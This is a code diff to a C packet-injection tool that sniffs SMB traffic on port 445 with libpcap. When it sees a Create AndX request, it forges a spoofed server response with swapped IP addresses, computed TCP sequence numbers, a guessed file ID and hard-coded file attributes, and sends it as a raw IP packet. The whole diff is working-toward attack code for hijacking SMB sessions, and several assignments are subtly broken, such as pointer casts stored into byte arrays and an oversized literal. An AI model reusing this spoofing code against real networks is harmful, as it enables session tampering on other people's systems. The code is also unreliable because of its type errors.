@@ -315,7 +315,7 @@ struct sniff_CAXR {
 	u_char  car_wc;			/* word count */
 	u_char  car_axc;                /* andxcommand */
 	u_char  car_res;                /* reserved */
-	u_short car_axo;		/* andxoffset */
+	u_char car_axo[2];		/* andxoffset */
 	u_char  car_ol;                 /* oplock level */
 	u_short car_fid;                /* fid */
 	u_int   car_ca;			/* create action */
@@ -345,7 +345,7 @@ struct sniff_CAXR {
 	u_short car_ipc;		/* ipc state */
 	u_char  car_isdir;		/* is directory */
 	u_char  car_vguid[16];		/* volume guid */
-	u_long  car_svrun;		/* server unique */
+	u_char  car_svrun[8];		/* server unique */
 	u_int   car_mar;		/* maximal access rights */
 	u_int   car_gmar;		/* guest maximal access rights */
 	u_short car_bc;			/* byte count */
@@ -358,7 +358,7 @@ void
 lockingAndXResponse(u_char *payload, int size_payload);
 
 void
-createAndXResponse(u_char *payload, char *fid);
+createAndXResponse(u_char *payload, u_short fid);
 
 void
 got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
@@ -531,7 +531,7 @@ void send_raw_ip_packet(struct sniff_ip* ip)
 
 void lockingAndXResponse(u_char *payload, int size_payload)
 {
-	u_char *newpayload =
+	/*u_char *newpayload =
 		"\x08"		// Word count
 		"\xff"		// AndXCommand: No further commands
 		"\x00"		// Reserved
@@ -544,36 +544,37 @@ void lockingAndXResponse(u_char *payload, int size_payload)
 		"\x00\x00"		// Number of locks
 		"\x00\x00"		// Byte count
 	;
-	memcpy(payload, newpayload, size_payload);
+	memcpy(payload, newpayload, size_payload);*/
 }
 
-void createAndXResponse(u_char *payload, char *fid)
+void createAndXResponse(u_char *payload, u_short fid)
 {
-	struct sniff_CAXR *newpayload = (struct snif_CAXR*)payload;
+	struct sniff_CAXR *newpayload = (struct sniff_CAXR*)payload;
 	
-	newpayload->car_wc = "\x2a";
-	newpayload->car_axc = "\xff";
-	newpayload->car_res = "\x00";
-	newpayload->car_axo = "\x87\x00";
-	newpayload->car_ol = "\x02"; 
-	newpayload->car_fid = "\x44\x44"; 
-	newpayload->car_ca = "\x01\x00\x00\x00";
-	newpayload->car_c = "\x3b\x87\x08\x2d\xa7\x7f\xd4\x01";
-	newpayload->car_la = "\x30\xa2\x63\x26\xb7\x7f\xd4\x01";
-	newpayload->car_lw = "\x46\x94\x86\xb5\xb6\x7f\xd4\x01" ;
-	newpayload->car_ch = "\x46\x94\x86\xb5\xb6\x7f\xd4\x01";
-	newpayload->car_fa = "\x20\x00\x00\x00";
-	newpayload->car_als = "\x00\x70\x00\x00\x00\x00\x00\x00";
-	newpayload->car_eof = "\x22\x6a\x00\x00\x00\x00\x00\x00";
-	newpayload->car_ft = "\x00\x00";
-	newpayload->car_ipc = "\x70\x00";
-	newpayload->car_isdir = "\x00";
-	newpayload->car_vguid[16] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-	newpayload->car_svrun = "\x00\x00\x00\x00\x00\x00\x00\x00";
-	newpayload->car_mar = "\xff\x01\x1f\x00";
-	newpayload->car_gmar = "\x00\x00\x00\x00";
-	newpayload->car_bc = "\x00\x00";
+	newpayload->car_wc = (u_char)0x2a;
+	newpayload->car_axc = (u_char)0xff;
+	newpayload->car_res = (u_char)0x00;
+	newpayload->car_axo[0] = (u_char*)0x0087;
+	newpayload->car_ol = (u_char)0x02; 
+	newpayload->car_fid = htons(fid); 
+	newpayload->car_ca = (u_int)0x00000001;
+	newpayload->car_c = (u_long)0x01d47fa72d08873b;
+	newpayload->car_la = (u_long)0x01d47fb72663a230;
+	newpayload->car_lw = (u_long)0x01d47fb6b5869446;
+	newpayload->car_ch = (u_long)0x01d47fb6b5869446;
+	newpayload->car_fa = (u_int)0x00000020;
+	newpayload->car_als = (u_long)0x0000000000007000;
+	newpayload->car_eof = (u_long)0x0000000000006a22;
+	newpayload->car_ft = (u_short)0x0000;
+	newpayload->car_ipc = (u_short)0x0070;
+	newpayload->car_isdir = (u_char)0x00;
+	newpayload->car_vguid[0] = (u_char*)0x00000000000000000000000000000000;
+	newpayload->car_svrun[0] = (u_char*)0x0000000000000000;
+	newpayload->car_mar = (u_int)0x001f01ff;
+	newpayload->car_gmar = (u_int)0x00000000;
+	newpayload->car_bc = (u_short)0x0000;
 
+	printf("\n%x\n",fid);
 
 	/*u_char *newpayload =
 		"\x2a"//"\xa2"		// Word count
@@ -615,11 +616,11 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	const char buffer[65536];
 
 	/* declare pointers to packet headers */
-	struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
+	//struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
 	struct sniff_ip *ip;              /* The IP header */
 	struct sniff_tcp *tcp;            /* The TCP header */
 	struct sniff_smb *smb;		/* The SMB header */
-	u_char *payload;                    /* Packet payload */
+	//u_char *payload;                    /* Packet payload */
 
 	int size_ip;
 	int size_tcp;
@@ -627,7 +628,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	int size_payload;
 	
 	/* define ethernet header */
-	ethernet = (struct sniff_ethernet*)(packet);
+	//ethernet = (struct sniff_ethernet*)(packet);
 	
 	/* define/compute ip header offset */
 	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
@@ -656,7 +657,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	size_payload = ntohl(SMB_SIZE(smb)) + 4 - size_smb;
 
 	/* define/compute smb payload (segment) offset */
-	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp + size_smb);
+	//payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp + size_smb);
 
 	/* compute smb payload (segment) size */
 	//size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp + size_smb);
@@ -673,7 +674,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	struct sniff_ip *newip = (struct sniff_ip *) ((u_char *)buffer);
 	struct sniff_tcp *newtcp = (struct sniff_tcp *) ((u_char *)buffer + size_ip);
 	struct sniff_smb *newsmb = (struct sniff_smb *) ((u_char *)buffer + size_ip + size_tcp); 
-	char *newpayload = ((u_char *)buffer + size_ip + size_tcp + size_smb);
+	u_char *newpayload = ((u_char *)buffer + size_ip + size_tcp + size_smb);
 
 	/* Construct IP header, TCP header, and SMB header */
 	newip->ip_src = ip->ip_dst; 
@@ -685,7 +686,6 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	newtcp->th_seq = tcp->th_ack;
 	newtcp->th_ack = htonl(ntohl(tcp->th_seq) + tcp_seg_len);
 
-	newsmb->smb_flg = ((smb)->smb_flg ^ 0x80);
 
         //printf("\nMem location copy: %p %x %s\n", newip->ip_src, newip->ip_src, inet_ntoa(newip->ip_src));
         //printf("\nTCP Mem location copy: %p %x  %u\n", newtcp->th_sport, newtcp->th_sport, ntohs(newtcp->th_sport));
@@ -705,10 +705,14 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	printf("\nsmb_cmd: %x\n", smb->smb_cmd);
 	if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_dport) == 445)
 	{
-		u_char* fid = calc_fid(newtcp->th_seq);
-		createAndXResponse(newpayload, *fid);
-		printf("\nNew Packet	Size: %u\n", (size_ip + size_tcp + size_smb + size_payload));
-		print_payload(newip, size_ip + size_tcp + size_smb + 103);
+		int packet_size = size_ip + size_tcp + size_smb + 103;
+		newip->ip_len = htons(packet_size);
+		newsmb->smb_nb=(u_int)0x87000000;
+		newsmb->smb_flg = ((smb)->smb_flg ^ 0x80);
+		u_short fid = calc_fid(newtcp->th_seq);
+		createAndXResponse(newpayload, fid);
+		printf("\nNew Packet	Size: %u\n", packet_size);
+		print_payload((u_char *)newip, packet_size);
 		send_raw_ip_packet(newip);
 	}
 	/*else if (smb->smb_cmd == 0x24 && ntohs(tcp->th_dport) == 445)
@@ -721,7 +725,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_sport) == 445)
 	{
 		printf("\nOld Packet	Size: %u\n", (size_ip + size_tcp + size_smb + size_payload));
-		print_payload(ip, size_ip + size_tcp + size_smb + size_payload);
+		print_payload((u_char *)ip, size_ip + size_tcp + size_smb + size_payload);
 	}
 
 	//print_payload(ip, size_ip + size_tcp + size_smb + size_payload);
